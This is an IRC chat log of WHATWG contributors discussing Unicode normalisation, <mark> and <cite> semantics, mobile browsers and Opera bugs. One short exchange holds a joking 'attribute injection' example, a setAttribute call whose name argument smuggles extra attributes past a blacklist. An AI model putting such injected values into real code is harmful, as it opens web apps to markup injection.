[21:39:04.0000] <Hixie>
weinig: when it comes to unicode normalisation, am i wrong? :-)

[21:39:05.0000] <weinig>
Lachy: we have not implemented the NSResolver part of the spec yet

[21:39:06.0000] <weinig>
Hixie: no, you are not wrong :)

[21:39:07.0000] <Hixie>
see :-D

[21:40:00.0000] <Lachy>
oops, missed [06:24]  <Lachy> how do I deal with the unicode normalisation issue?

[21:41:00.0000] <Lachy>
weinig, see point 3 in http://lists.w3.org/Archives/Public/public-webapi/2008Feb/0095.html

[21:42:00.0000] <Lachy>
so, basically, the question is should the UA pass the prefix to the resolver in normalised form or exactly as it was used in the selector

[21:43:00.0000] <Hixie>
Lachy: xml requires normalisation of tag names right?

[21:43:01.0000] <Hixie>
Lachy: so the selector has to be normalised to that normalisation form anyway

[21:43:02.0000] <Hixie>
Lachy: so i'd say require that the selector be normalised to whatever normalisation form xml requires

[21:44:00.0000] <weinig>
Lachy: hm, it seems that if we normalization of the prefix, that also means we have to normalize the selectors 

[21:44:01.0000] <Lachy>
I'm not sure what XML says about normalisation

[21:44:02.0000] <Hixie>
check :-)

[21:44:03.0000] <weinig>
Lachy: oh, I see Hixie just said that :)

[21:44:04.0000] <Lachy>
do you normalise the selectors?

[21:44:05.0000] <weinig>
Lachy: I don't believe so

[21:45:00.0000] <weinig>
Lachy: though, as Hixie noted, I may not know :)

[21:45:01.0000] <Hixie>
spec writing involves doing a lot of study work, examining implementations and other specs :-P

[21:45:02.0000] <weinig>
/me nods

[21:45:03.0000] <Lachy>
/me is too lazy for that :-)

[21:46:00.0000] <Hixie>
could be a problem :-)

[21:46:01.0000] <weinig>
I am going to say that we in fact do not normalize the string before parsing the selector

[21:47:00.0000] <Hixie>
you sure? i wouldn't bet in your js layer did it for you...

[21:47:01.0000] <Hixie>
er

[21:47:02.0000] <Hixie>
s/bet/be surprised/

[21:47:03.0000] <weinig>
/me checks there

[21:48:00.0000] <Hixie>
afk

[21:48:01.0000] <Lachy>
/me wonders how to write a test to see how browsers handle normalisation

[21:49:00.0000] <weinig>
Lachy: that could obviate most of these questions :)

[21:49:01.0000] <Lachy>
the Selectors spec says nothing about normalisation

[21:49:02.0000] <weinig>
I didn't think ECMAScript required normalization of strings

[21:50:00.0000] <Lachy>
I don't think it does either

[21:51:00.0000] <weinig>
in that case, I really don't think we normalize, but I would still like to test it

[21:51:01.0000] <weinig>
ap would know for sure

[21:52:00.0000] <Lachy>
can you find out from whoever knows and send feedback about it to public-webapi?

[21:53:00.0000] <weinig>
Lachy: yes

[21:53:01.0000] <Lachy>
/me needs to discuss it with the devs at opera

[21:53:02.0000] <Lachy>
thanks

[21:53:03.0000] <weinig>
no problem

[00:27:00.0000] <annevk>
Lachy, no need to do normalization

[00:27:01.0000] <annevk>
Lachy, nobody does that

[00:33:00.0000] <hsivonen>
jgraham++

[00:37:00.0000] <Hixie>
annevk: it's done more than you think

[00:38:00.0000] <Hixie>
(and there are multiple types of normalisation)

[00:38:01.0000] <Hixie>
(some of which make a lot of sense to do at certain points, others don't)

[00:39:00.0000] <Hixie>
however, it seems xml doesn't require normalisation

[00:39:01.0000] <Hixie>
so it would seem best to not do it here

[00:39:02.0000] <Hixie>
why am i doing this research :-P

[00:40:00.0000] <Hixie>
/me goes back to doing the research for his own spec :-P

[00:41:00.0000] <annevk>
I'd be interested to know where NFC is applied in specifications authors deal with and authors provide the strings

[00:42:00.0000] <Hixie>
NFKC is applied when creating the punycode form of IDN, iirc

[00:44:00.0000] <annevk>
ah, yeah

[00:45:00.0000] <annevk>
I guess that's because i18n experts have been actively involved in that

[00:45:01.0000] <Hixie>
it would be a security disaster if it wasn't

[00:45:02.0000] <Hixie>
it's bad enough as it is

[00:46:00.0000] <annevk>
true

[03:14:00.0000] <annevk>
heycam, any chance you can make an update for test 69 in Acid3? the summary for instance is bogus now

[03:14:01.0000] <annevk>
well, partially bogus

[03:28:00.0000] <webben>
Lachy: Hi there, with http://lachy.id.au/log/2005/05/script-comments in the "The Correct Method for XHTML" what's the // in //]]> for? contrasting with http://www.w3.org/TR/xhtml1/#h-4.8

[03:29:00.0000] <Lachy>
that applies when serving as text/html, as the article should point out

[03:29:01.0000] <Lachy>
it's to comment it out so it doesn't cause a JS error

[03:30:00.0000] <Lachy>
oh, oops

[03:30:01.0000] <Lachy>
yeah, it's not needed.

[03:30:02.0000] <Lachy>
but harmless

[03:30:03.0000] <hsivonen>
What's the browser support status of http://contentlabel.org/ ?

[03:31:00.0000] <hsivonen>
(the technology advocated--not the site itself)

[03:34:00.0000] <Lachy>
Since it uses RDF and believes it can some how use it to increase trust (highly unlikely), I'm going to guess zero support

[03:37:00.0000] <webben>
I http://contentlabel.org/firefox-extension-that-reads-semantic-labelled-sites/

[03:38:00.0000] <webben>
so it's vapourware except for their own Fx extension

[03:39:00.0000] <webben>
(which isn't as bad as some things, I guess)

[03:40:00.0000] <hsivonen>
it's not clear to me what the motivation is. 1) Protecting children? 2) Causing an illusion of porn self-regulation in order to lessen government interest in statutory regulation 3) find a nail for a SemWeb hammer. 4) something else?

[03:41:00.0000] <gsnedders>
It's possible to filter the web. kthxbai.

[03:41:01.0000] <webben>
hsivonen: Sell Segala trust labels I suspect.

[03:42:00.0000] <hsivonen>
webben: hmm. yeah, that's a very plausible explanation

[03:43:00.0000] <webben>
I think currently their main customer is O2.

[03:44:00.0000] <webben>
how useful segala certification is perhaps open to doubt however: http://www.blether.com/archives/2006/06/da_vinci_code_t.php

[03:44:01.0000] <annevk>
"Using W3C standards such as RDF makes mass adoption for Content Labels more seamless in our opinion." hmm

[03:45:00.0000] <webben>
well, using standards /should/ help adoption (at least, assuming the standards are workable)

[03:47:00.0000] <webben>
and there are plenty of tools that can extract stuff from RDF

[03:47:01.0000] <gsnedders>
All W3C standards are totally widespread.

[03:47:02.0000] <webben>
gsnedders: well, all w3c standards are at least open to implementors

[03:47:03.0000] <gsnedders>
webben: That's not overly relevant if nobody uses them, though

[03:48:00.0000] <annevk>
though not all are implementable

[03:48:01.0000] <webben>
like I said: "assuming the standards are workable"

[03:48:02.0000] <webben>
RDF has been implemented, so it is workable.

[03:50:00.0000] <Lachy>
RDF is too complicated and only solves imaginary problems

[03:50:01.0000] <webben>
indeed, it's even implemented in browsers to some degree.

[03:54:00.0000] <webben>
'saying stuff about stuff in a machine-readable manner" is an imaginary problem?

[03:55:00.0000] <webben>
or do you mean the added complications only solve imaginary problems in that task?

[04:01:00.0000] <hsivonen>
hmm. looks like Segala is into the MobileOK stuff as well

[04:01:01.0000] <hsivonen>
I don't like MobileOK at all

[04:02:00.0000] <webben>
how come?

[04:02:01.0000] <webben>
/me hasn't looked at it.

[04:03:00.0000] <webben>
http://www.w3.org/TR/mobileOK-basic10-tests/ ... interesting worked on by a google fellow and someone who used to work at Segala

[04:03:01.0000] <hsivonen>
webben: the Mobile OK thing is based on the assumption that mobile browsers suck and that content needs to be dumbed down

[04:04:00.0000] <webben>
well, that's probably true of a lot of current deployment

[04:05:00.0000] <webben>
hopefully not so true in future

[04:05:01.0000] <hsivonen>
webben: The mobile browsers I use can do much more than what is assumed by Mobile OK

[04:05:02.0000] <webben>
yes, I'd tend to assume web-loving folk would use better clients than average

[04:05:03.0000] <hsivonen>
webben: the mobile browsers I use are based on Gecko, Opera and WebKit

[04:06:00.0000] <webben>
yes, but those are very much a new breed aren't they?

[04:07:00.0000] <webben>
guess it depends how fast such devices get rolled out into growth markets

[04:07:01.0000] <hsivonen>
webben: I have about zero sympathy for bad products when at least three better ones are available

[04:08:00.0000] <hsivonen>
webben: Opera Mini works on remarkably sucky phones

[04:08:01.0000] <webben>
opera mini is good

[04:08:02.0000] <webben>
dunno what the state of its localization is though

[04:11:00.0000] <webben>
http://operawatch.com/news/2007/11/opera-mini-translated-into-over-50-languages-15-more-to-come-later-this-month.html

[05:03:00.0000] <hsivonen>
http://lists.w3.org/Archives/Public/public-html-comments/2008Feb/0011.html

[05:03:01.0000] <hsivonen>
I'm not sure how I should react

[05:05:00.0000] <annevk>
http://annevankesteren.nl/2007/04/html-red-pill

[05:23:00.0000] <Philip`>
/me wonders why Opera uses 1005MB of memory and then takes two minutes to exit

[05:28:00.0000] <hsivonen>
well, replied anyway.

[05:42:00.0000] <jwalden>
"The reference image for Acid3 as rendered by WebKit r30069."  wow, Wikipedia, thanks for telling me that this *reference image* screenshot was done with WebKit, and with a revision number too!

[05:48:00.0000] <annevk>
you can fix that :p

[05:49:00.0000] <annevk>
I wonder why they took out the screen shots of beta releases though

[05:53:00.0000] <krijnh>
Philip`: I have that constantly

[05:56:00.0000] <krijnh>
Hope it's fixed with 9.5

[05:59:00.0000] <annevk>
for real?

[05:59:01.0000] <annevk>
/me doesn't have that problem at all

[05:59:02.0000] <krijnh>
I haven't installed 9.2

[06:00:00.0000] <krijnh>
Perhaps that's the problem

[06:00:01.0000] <Philip`>
Steps to reproduce: Visit lots of web pages for a couple of days

[06:00:02.0000] <krijnh>
I had a laptop crash, bought a new one, and copied the Opera dir from my other disk

[06:00:03.0000] <Philip`>
(I'm using 9.2something)

[06:00:04.0000] <krijnh>
(which is one of the best things Opera provides)

[06:00:05.0000] <Philip`>
(It's not a problem with e.g. Flash, because I've got plugins disabled since Flash didn't work anyway)

[06:01:00.0000] <krijnh>
(and we both like parentheses)

[06:02:00.0000] <Philip`>
(They are an aesthetically pleasing curve)

[06:02:01.0000] <krijnh>
Perhaps it's Vista

[06:02:02.0000] <Philip`>
/me is using Linux

[06:03:00.0000] <krijnh>
I don't think it's Vista

[06:03:01.0000] <krijnh>
:p

[06:03:02.0000] <krijnh>
Mem usage here is around 200MB, even after closing Opera

[06:03:03.0000] <krijnh>
And it drops after a few minutes

[06:04:00.0000] <krijnh>
And if you restart it when it's not closed down yet, I get a mail init error

[06:04:01.0000] <krijnh>
s/you/I

[06:05:00.0000] <krijnh>
Anyway, I'm still alive, so it's probably not a big issue :)

[06:13:00.0000] <annevk>
Philip`, I almost never reboot Opera and I don't encounter this problem (I'm on Linux too, Opera 9.2x)

[06:13:01.0000] <annevk>
hopefully it's better in 9.5

[06:18:00.0000] <krijnh>
annevk: you also use M2?

[06:18:01.0000] <annevk>
yeah

[06:19:00.0000] <annevk>
and IRC

[06:19:01.0000] <krijnh>
Hmm

[06:19:02.0000] <krijnh>
9.5 also takes a while to close down for me, on a different machine

[06:45:00.0000] <annevk>
hmm, I can project my laptop on my TV, but not both at the same time :(

[06:55:00.0000] <Philip`>
The laptop display switches off when you connect the TV?

[06:57:00.0000] <annevk>
some distorted display, now it sort of works

[06:58:00.0000] <annevk>
it's not perfect though as my TV only shows 2/3 of the screen

[06:59:00.0000] <annevk>
tv has a res of 1360x768 and the laptop has 1680x1080

[07:00:00.0000] <annevk>
but I can watch movies now, sort of

[07:01:00.0000] <annevk>
(oh also sound isn't patched through, but I guess that's to be expected with a VGA connector :) )

[07:06:00.0000] <hsivonen>
annevk: hmm. 1080p laptop. nice. what are the physical dimensions?

[07:07:00.0000] <Philip`>
1080p is usually 1920x1080, so it's a bit misleading to call it that

[07:08:00.0000] <hsivonen>
oh. right

[07:11:00.0000] <Philip`>
/me discovers that Ubuntu's do-release-upgrade is not foolproof, as it failed with "Could not install the upgrades. The upgrade aborts now. Your system could be in an unusable state."

[07:11:01.0000] <hsivonen>
I went to a home eletronics store the other day. they had a wall full of flat 720p and 1080p TVs and the same blu-ray 1080p feed into all of them

[07:11:02.0000] <hsivonen>
I couldn't tell the difference between 1080p and 720p

[07:12:00.0000] <hsivonen>
and I couldn't tell the difference between 890 euro models and 1700 euro models

[07:12:01.0000] <hsivonen>
makes one go hmm.

[07:15:00.0000] <Philip`>
The only TV I watch is over streaming Flash and costs me £0 (plus no TV Licence fee) and the quality seems perfectly adequate :-)

[07:16:00.0000] <Philip`>
But movies are different, since quality is often much more important there

[07:20:00.0000] <jwalden>
Philip`: exactly what drugs were you on when you decided you wanted to do Element.setAttribute(":", ...) anyway? :-P

[07:21:00.0000] <Philip`>
jwalden: I just wanted to do things http://philip.html5.org/tools/parser/?%3Ctest%3Atest%20test%3Atest%20%3Atest%3E and detect when I was about to create an invalid attribute so I could get rid of the offending characters

[07:22:00.0000] <Philip`>
s/things/things like/

[07:23:00.0000] <Philip`>
but that turns out to be impossible because "invalid attribute" varies between browsers, rather than following any standard

[07:26:00.0000] <jwalden>
not like anyone actually specified that at the time browsers implemented it, really

[07:26:01.0000] <jwalden>
/me wonders why hand-waving is so prevalent in specs

[07:26:02.0000] <Philip`>
I'd be happiest if nothing was considered an invalid attribute, since otherwise it's impossible to write a conforming HTML5 parser using the JS DOM

[07:27:00.0000] <jwalden>
Element.setAttribute(" foo='bar' baz", "quux")

[07:27:01.0000] <jwalden>
attribute injection!

[07:29:00.0000] <Philip`>
Wouldn't it be easier to do Element.setAttribute('foo', 'bar') if you're able to control the arguments? :-p

[07:29:01.0000] <jwalden>
not necessarily, if the first argument was checked against a blacklist

[07:30:00.0000] <jwalden>
I don't presume to expect rational behavior in random web apps

[07:30:01.0000] <jwalden>
cf. ":" ;-)

[07:31:00.0000] <Philip`>
IE and Opera users would already be vulnerable if a web app did that

[07:31:01.0000] <Philip`>
hence web apps can't do that

[07:32:00.0000] <Philip`>
hence it's not a security problem :-)

[07:32:01.0000] <jwalden>
/me defines security problems out of existence

[12:38:00.0000] <Fiboknight>
hello

[12:38:01.0000] <Lachy>
Fiboknight, hi

[12:38:02.0000] <Fiboknight>
how may i get access to your irc log script?

[12:38:03.0000] <Lachy>
ask krijnh

[12:38:04.0000] <Lachy>
he runs it

[12:39:00.0000] <Fiboknight>
oh ok

[12:39:01.0000] <Fiboknight>
are you a dev as well?

[12:40:00.0000] <Lachy>
I was a web developer

[12:42:00.0000] <Fiboknight>
cool

[13:53:00.0000] <gsnedders>
do adjacent text nodes have implicit whitespace between the two?

[13:54:00.0000] <gsnedders>
Lachy: see the email I sent?

[14:08:00.0000] <Hixie>
they do not

[14:11:00.0000] <gsnedders>
that's what I expected

[14:11:01.0000] <gsnedders>
Why would (in Python) `else Element.textContent:` cause a syntaxerror?

[14:11:02.0000] <Dashiva>
why not?

[14:12:00.0000] <hasather>
gsnedders: elif

[14:12:01.0000] <gsnedders>
hasather: oh duh.

[14:12:02.0000] <gsnedders>
/me headdesks

[14:12:03.0000] <gsnedders>
thx

[14:12:04.0000] <Dashiva>
This is not the syntax you're looking for *handwave*

[14:13:00.0000] <gsnedders>
Dashiva: hey! I'm allowed to be dumb at times! :)

[14:13:01.0000] <gsnedders>
Dashiva: don't be mean to the kid!

[14:14:00.0000] <Dashiva>
I'm just trying to lighten the mood with some humor

[14:15:00.0000] <gsnedders>
And I'm being totally serious :)

[14:15:01.0000] <gsnedders>
(obviously)

[14:15:02.0000] <gsnedders>
</sarcasm>

[14:15:03.0000] <Dashiva>
Parse error

[14:15:04.0000] <gsnedders>
Dashiva: what? you think you need a start tag! Silly XML making you think such things.

[14:15:05.0000] <Hixie>
<sarcasm> is an optional start tag

[14:16:00.0000] <gsnedders>
like <html>, <head>, and <body>

[14:16:01.0000] <gsnedders>
/me actually saw a real site which omitted the opening head tag, but not the closing one, a few weeks ago

[14:16:02.0000] <Dashiva>
gsnedders: Since when is IRC sent as text/html? :P

[14:17:00.0000] <gsnedders>
Dashiva: it's text/plain;charset=unknown, so why any parser error ever? :P

[14:18:00.0000] <Dashiva>
I have to parse your writing to understand it

[14:18:01.0000] <gsnedders>
peh!

[14:18:02.0000] <gsnedders>
parsing is overrated.

[14:19:00.0000] <Hixie>
wow, the whatwg copy of html5 sure has dropped down the rankings

[14:19:01.0000] <gsnedders>
Hixie: talking of HTML 5, you have any need for ul.toc on _every_ nested ul in the TOC?

[14:20:00.0000] <gsnedders>
actually, why isn't it an ol?

[14:21:00.0000] <Hixie>
no idea on either point

[14:21:01.0000] <gsnedders>
it should be an ol, no?

[14:21:02.0000] <Hixie>
probably

[14:22:00.0000] <gsnedders>
/me goes back to designing an algorithm to actually create the TOC

[14:22:01.0000] <Hixie>
the html5 spec has one of those :-)

[14:23:00.0000] <Hixie>
though it's hard to understand

[14:23:01.0000] <gsnedders>
it does?

[14:23:02.0000] <gsnedders>
oh, that one

[14:23:03.0000] <gsnedders>
/me totally forgot

[14:25:00.0000] <gsnedders>
the creating an outline section?

[14:26:00.0000] <Lachy>
gsnedders, the proxy script you sent me doesn't correctly pass the username and password

[14:26:01.0000] <gsnedders>
Lachy: I just realised that

[14:28:00.0000] <jgraham>
/me has an imp. of the HTML 5 algorithm somewhere but doesn't recommend it

[14:31:00.0000] <gsnedders>
/me emails Lachy the "don't write PHP scripts quickly thinking you can write them fine" edition.

[14:31:01.0000] <Hixie>
jgraham: the alg, or the results?

[14:32:00.0000] <jgraham>
Hixie: What do you mean results?

[14:32:01.0000] <jgraham>
I think the algorithm does the right thing

[14:32:02.0000] <jgraham>
(more or less)

[14:32:03.0000] <Hixie>
that's what i meant by results

[14:34:00.0000] <jgraham>
I mostly meant that I don't recommend my implementation, although I have no particular love for the way the algorithm is expressed either

[14:34:01.0000] <gsnedders>
/me is scratching his head at parts of the description

[14:35:00.0000] <Hixie>
jgraham: k

[14:35:01.0000] <Hixie>
bbl

[14:35:02.0000] <gsnedders>
bye

[14:37:00.0000] <gsnedders>
(I actually meant creating the actual TOC output, not creating it internally, but hey)

[14:39:00.0000] <Lachy>
gsnedders, you still didn't get it quite right :-)

[14:39:01.0000] <Lachy>
but I fixed it

[14:39:02.0000] <gsnedders>
Lachy: what now?

[14:39:03.0000] <gsnedders>
oh. ).

[14:39:04.0000] <Lachy>
yeah

[14:39:05.0000] <Lachy>
it all works

[14:40:00.0000] <gsnedders>
A change so minor that "nothing" can go wrong. But of course it now causes parse errors. Typical :)

[14:46:00.0000] <gsnedders>
/me waves g'nite

[15:58:00.0000] <Fiboknight>
please someone help me with an irc logger


2008-02-17
[16:03:00.0000] <Philip`>
/me sees that we are second on http://www.google.com/search?q=irc+log

[16:03:01.0000] <Philip`>
or fourth, if I use a different browser

[16:04:00.0000] <Philip`>
Hooray for personalised search results

[16:04:01.0000] <Philip`>
I'm not sure this is the best place to find out about IRC logging, though

[16:08:00.0000] <Fiboknight>
thanks

[12:15:00.0000] <krijnh>
Philip`: Yeah, I should put Google Ads on the logs ;)

[13:40:00.0000] <hsivonen>
http://lists.w3.org/Archives/Public/public-html-comments/2008Feb/0014.html

[13:40:01.0000] <hsivonen>
what's the actionable feedback?

[13:44:00.0000] <gsnedders>
jgraham: what lens you use for those two photos you just put on Flickr?

[13:48:00.0000] <webben>
hsivonen: Hmm. Well, Frank appears to want to be able to force a mime type in the validator. He also seems to want validator to test URIs are URIs not IRIs.

[13:50:00.0000] <hsivonen>
would Validator.nu users be better off in general if I made the XHTML 1.0 schemas really require URIs instead of IRIs?

[13:51:00.0000] <webben>
if XHTML 1.0 requires URIs not IRIs and validator users are trying to validate XHTML 1.0 then yes.

[13:53:00.0000] <hsivonen>
I guess it depends on whether you consider external refs to be independently updateable

[13:54:00.0000] <hsivonen>
like the it wouldn't do anyone any good if Validator.nu used Unicode 2 insteado of Unicode 5

[13:54:01.0000] <hsivonen>
although W3C specs in general haven't yet been updated to point to Unicode 5.0

[13:57:00.0000] <webben>
you mean the IRI requirement is set in a different spec?

[13:58:00.0000] <webben>
I guess that would depend on the spec.

[13:58:01.0000] <webben>
If it's debatable, then you'd need to give users an option.

[13:58:02.0000] <webben>
or seek clarification from whoever's responsible for the spec in question

[13:58:03.0000] <hsivonen>
webben: I mean if a spec points to URIs when IRIs weren't specified, should software developers treat IRI as an update of URI as far as markup language attribute values go

[13:59:00.0000] <annevk>
hsivonen, I don't think it's worth bothering about details that should've been errated in specs long ago

[13:59:01.0000] <annevk>
(and where the spec in fact hints that the situation is going to change)

[13:59:02.0000] <jgraham>
gsnedders: Cannon 60mm EF-S 2.8 Macro

[14:00:00.0000] <webben>
hsivonen: only the group responsible for maintaining the XHTML 1.0 spec people are trying to validate to can answer that one way or the other.

[14:00:01.0000] <webben>
I guess that's Pemberton's lot atm.

[14:00:02.0000] <gsnedders>
jgraham: I was thinking of getting that sometime (in a while, as I want a telephoto lens first)

[14:01:00.0000] <jgraham>
hsivonen: I guess the practical answer depends on whether any software depends on URIs-only

[14:02:00.0000] <hsivonen>
jgraham: really old browsers do

[14:02:01.0000] <jgraham>
gsnedders: You should consider the 100mm Macro too; I didn't get it because this one was cheaper and someone else was paying

[14:02:02.0000] <gsnedders>
jgraham: I really don't do much macro photography, so I really wouldn't want to get a very expensive one

[14:03:00.0000] <jgraham>
hsivonen: s/software/current software/ then. 

[14:03:01.0000] <hsivonen>
I'm inclined to fix this in documentation and claim that the schema isn't XHTML 1.0 but XHTML 1.0 plus IRI

[14:04:00.0000] <jgraham>
gsnedders: Well with lenses "expensive" means very different things to different people :)

[14:04:01.0000] <gsnedders>
jgraham: that's true :)

[14:12:00.0000] <gsnedders>
jgraham: for a start: L lenses are madly expensive :)

[14:37:00.0000] <Hixie>
i have way too much fun making my examples in the spec refer to things i like

[14:41:00.0000] <Lachy>
Hixie, what examples are you adding to the spec now, and what do they refer to?

[14:41:01.0000] <Hixie>
<m> (now called <mark>)

[14:41:02.0000] <hsivonen>
http://omniplex.blogspot.com/2007/05/fictitious-u1e9e-character-endorsed-by.html

[14:41:03.0000] <Hixie>
and you'll have to see if you can guess them :-)

[14:41:04.0000] <Lachy>
ok

[14:42:00.0000] <hsivonen>
Unicode needs a mechanism that stops the implementation cost of a new character from being an externality from the proposer point of view

[14:43:00.0000] <Lachy>
I still never figured out that ΑΒΓ company alt text example

[14:44:00.0000] <Lachy>
though, I found out the XYZ company example is possibly a reference to one of your old test cases on your site

[14:47:00.0000] <Hixie>
that's all it was iirc

[14:49:00.0000] <Lachy>
the ΑΒΓ company one too? I haven't seen that test case yet. Though, it'll probably show up in spartan one day

[14:49:01.0000] <Hixie>
i think it's just a different company with the same kind of name

[14:49:02.0000] <Hixie>
but i could be mistaken

[15:01:00.0000] <Hixie>
/me checks in the new <mark> element

[15:01:01.0000] <webben>
is that m with a longer name?

[15:02:00.0000] <Hixie>
yes

[15:02:01.0000] <Hixie>
the list of people bcc'ed on this e-mail is basically the list of people who contribute to the spec on a regular basis

[15:02:02.0000] <Hixie>
it's quite a long list

[15:02:03.0000] <Hixie>
like, 20+ names

[15:03:00.0000] <Hixie>
woot, that cleared out 74 e-mails in one go

[15:03:01.0000] <Lachy>
woah, that's one long email!

[15:04:00.0000] <Lachy>
anything worth reading in it?

[15:04:01.0000] <Hixie>
it's basically summarised at the top

[15:04:02.0000] <Hixie>
i didn't add much commentary

[15:05:00.0000] <Hixie>
/me optimistically deletes the "input-for-whatwg-semantics-phrasing-m" folder

[15:17:00.0000] <Hixie>
so the next topic is <Cite>

[15:17:01.0000] <Hixie>
should it be only for citations, or for any title of work?

[15:17:02.0000] <annevk>
you could add an example that uses the irc logs which are hilited in exactly the suggested way

[15:17:03.0000] <annevk>
Hixie, only titles of work?

[15:18:00.0000] <Hixie>
is that a vote or a question? :-)

[15:19:00.0000] <Lachy>
people use it for titles of work in practice. I see no reason to restrict that

[15:19:01.0000] <annevk>
Hixie, it's what hsivonen and DanC want I think

[15:19:02.0000] <Hixie>
(and yeah, irc might be a good thing to add)

[15:20:00.0000] <Hixie>
brb, intermission shift

[15:20:01.0000] <annevk>
I've used it for citations, but only because I wanted to comply to HTML4...

[15:20:02.0000] <Dashiva>
/me is shocked

[15:21:00.0000] <Lachy>
/me giggles at yet another Stargate reference in the spec :-)

[15:22:00.0000] <Dashiva>
Will the conspiracy of light manage to sneak itself in there?

[15:22:01.0000] <Lachy>
Hixie, s/just under 39 minutes/just over 38 minutes/

[15:24:00.0000] <Lachy>
the only ones to last longer than a few seconds past 38 minutes had powerful energy sources keeping them open

[15:26:00.0000] <Lachy>
Hixie, s/and a large gravity well/or a large gravity well/

[15:36:00.0000] <csarven>
/me reads Hixie's email

[15:39:00.0000] <csarven>
"The semantic in question isn't the kind of thing I would imagine would fit the microformat ethos." -- which is correct

[15:40:00.0000] <tantek>
which semantic?

[15:41:00.0000] <csarven>
<mark> (which was <m>)

[15:43:00.0000] <csarven>
tantek http://www.w3.org/html/wg/html5/#the-mark

[15:44:00.0000] <tantek>
hmm.. last time i tried viewing the html5 spec it locked up firefox. not sure i want to click that link ;)

[15:51:00.0000] <jgraham>
/me wonders what the use case of marking titles is

[15:54:00.0000] <Lachy>
tantek, here's the multipage version http://www.whatwg.org/specs/web-apps/current-work/multipage/section-phrase.html#the-mark

[15:56:00.0000] <Lachy>
but even the single page version shouldn't lock up firefox. I look at it all the time without any problems. It generally loads in about 5-10 seconds for me

[15:58:00.0000] <jgraham>
At one point I was having an issue with the spec and a ff extension, but I don't recall which one


2008-02-18
[16:01:00.0000] <Hixie>
Lachy: a few seconds above 38 is a few seconds under 39 :-P

[16:01:01.0000] <Hixie>
and i think the conditions include A and B is correct

[16:02:00.0000] <jgraham>
To clarify, by "marking titles" above, I meant marking them up using <cite> rather than anything to do with <mark>

[16:03:00.0000] <Hixie>
jgraham: "my favourite book series is <cite>The Night Dawn's Trilogy</cite>."

[16:04:00.0000] <webben>
the HTML specs have been consistent in making cite mean citation not just title e.g. "The CITE element is used to indicate the title of a book or other citation" (HTML 2.0). "CITE used for citations or references to other sources" (HTML 3.2).

[16:04:01.0000] <jgraham>
Hixie: So, apart from the italics for visual presentation, why should I care that it's a book title rather than something else?

[16:04:02.0000] <webben>
it's also worth noting that not all titles are italicized

[16:05:00.0000] <Hixie>
jgraham: "So, apart from the italics for visual presentation, why should I care that it's emphasis rather than importance?"

[16:05:01.0000] <webben>
and if one were to restrict cite to titles that happen to be italicized in a particular citation style, it's hard to see any advantage of cite over i

[16:05:02.0000] <jgraham>
(Do non-visual UAs do something different for <cite> compared to e.g. <i>)?

[16:05:03.0000] <webben>
I'm not sure what they do.

[16:06:00.0000] <tantek>
csarven, agreed, the semantic of <mark> is better suited to HTML than a microformat. it sounds like a special purpose <em> element IMHO.

[16:07:00.0000] <webben>
Probably the most interesting consuming agent to look at would be Zotero, see if they do anything with it.

[16:07:01.0000] <webben>
(or would like to do anything with it)

[16:07:02.0000] <jgraham>
Hixie: in the case of something generic like emphasis v importance, I can imagine that there will be a presentational distinction in all media

[16:07:03.0000] <jgraham>
and many uses

[16:08:00.0000] <tantek>
jgraham, if a UA knows semantically that something is the name of a book or other such reference, it may be possible for it to look it up in various citation references, or points of viewing/previewing/purchase.

[16:08:01.0000] <Hixie>
jgraham: i guess the real question is whether we should define "citation" as only something to which more than a passing reference is made, or whether any reference to another work is enough to be considered a citation

[16:08:02.0000] <jgraham>
tantek: Is that realistic, given how non-unique titles of works are?

[16:08:03.0000] <webben>
Hixie: Agreed that a big problem with CITE is clarifying what citation is. e.g. not quotation

[16:09:00.0000] <csarven>
tantek I agree. It appears to me more of an element that is used for visual or interaction then a semantic representation of some content. I can understand the real-world use cases but that tends to get into a gray area IMO

[16:09:01.0000] <Lachy>
Hixie, the series always said 38 minutes, and most close closer to 38 minutes than to 39 minutes.  (There was only one that lasted 38:34 in Chain Reaction, but that extra time was because the planet became a ball of plasma)

[16:09:02.0000] <tantek>
jgraham, seems to work well enough in practice, humans communicate names of movies, songs, books all the time and are able to get value out of such communication.

[16:09:03.0000] <Hixie>
jgraham: i would imagine it is realistic in the context of a specific site with some specific JS to do e.g. referrals to amazon

[16:09:04.0000] <webben>
Note that in academic circles, you cite people as sources not just works.

[16:10:00.0000] <Hixie>
Lachy: agreed

[16:10:01.0000] <Lachy>
Hixie, it needs to say "or" instead of "and" because the it only requires one or the other, not both

[16:10:02.0000] <jgraham>
tantek: It's not clear to me that all things that work well in two-way human-human conversation translate to good UI for browsers

[16:10:03.0000] <Hixie>
Lachy: (38 is a number in stargate used in much the same way as 47 in startrek)

[16:11:00.0000] <Hixie>
Lachy: the list includes A and B, i don't say "it can happen if A and B"

[16:11:01.0000] <tantek>
jgraham, we don't need "all things", just 80/20. no need to boil the ocean.

[16:11:02.0000] <Lachy>
/me covers his ears and starts yelling "NOT LISTENING!" :-)

[16:11:03.0000] <jgraham>
To me a citation is specifically a work that is drawn on by the current work and should be referenced for background

[16:12:00.0000] <tantek>
Hixie, is that also true for wormholes between supergates?

[16:12:01.0000] <Lachy>
/me chooses to believe the 38 minute limit can be explained by quantum mechanics

[16:12:02.0000] <Lachy>
:-)

[16:12:03.0000] <jgraham>
tantek: Still, I don't recally any of the systems for "helpfully" adding referral links to webpages based on keywords ever hitting anything like an 80/20 point for me

[16:12:04.0000] <Hixie>
bbl

[16:14:00.0000] <tantek>
jgraham, true, invisible meta keywords FAIL. visible tags FTW.  also human-based folksonomy currently wins over "helpful" AI autotagging.

[16:15:00.0000] <jgraham>
/me -> sleep

[16:15:01.0000] <csarven>
NLP is trying to solve a much greater problem which probably won't really be solved anytime 'soon'

[16:17:00.0000] <csarven>
(At least in digital computing)

[16:17:01.0000] <tantek>
csarven, true. just let the singularity solve the NLP problem.

[16:18:00.0000] <Hixie>
(sorry, had a shift)

[16:19:00.0000] <Hixie>
tantek: no iea

[16:19:01.0000] <Hixie>
Lachy: long story short, it's just an example. :-P

[16:20:00.0000] <Hixie>
anyway. we clearly must keep <cite>, and since we're keeping it, how to define it is key

[16:20:01.0000] <webben>
systems referring users to for-pay systems are probably a bit less useful (and of course, a bit more profitable) than something referring users to e.g. a university library resource resolver

[16:20:02.0000] <Hixie>
i'm not going off for a few hours. got another shfit and then i'm off to the other side of the stage and then to dinner.

[16:20:03.0000] <Hixie>
bbl.

[16:20:04.0000] <Hixie>
i'll read any insights you have upon my return :-)

[16:21:00.0000] <Philip`>
